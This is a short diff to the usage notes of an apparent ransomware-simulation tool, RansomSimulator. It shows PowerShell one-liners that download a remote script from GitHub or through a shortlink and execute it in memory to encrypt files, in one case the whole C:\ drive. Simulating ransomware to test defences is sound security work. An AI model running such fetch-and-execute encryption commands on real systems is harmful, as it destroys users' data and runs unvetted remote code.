@@ -8,7 +8,8 @@ Encryption -
 
 PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1");Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';
 
-You may use shortlinks as well, example: PS> IEX (New-Object Net.WebClient).DownloadString("https://lnkd.in/gzTmAiKu");Invoke-RansomSIM -Mode Encrypt -Path 'C:\';
+You may use shortlinks as well, example: 
+PS> IEX (New-Object Net.WebClient).DownloadString("https://lnkd.in/gzTmAiKu");Invoke-RansomSIM -Mode Encrypt -Path 'C:\';
 
 Decryption - 
 
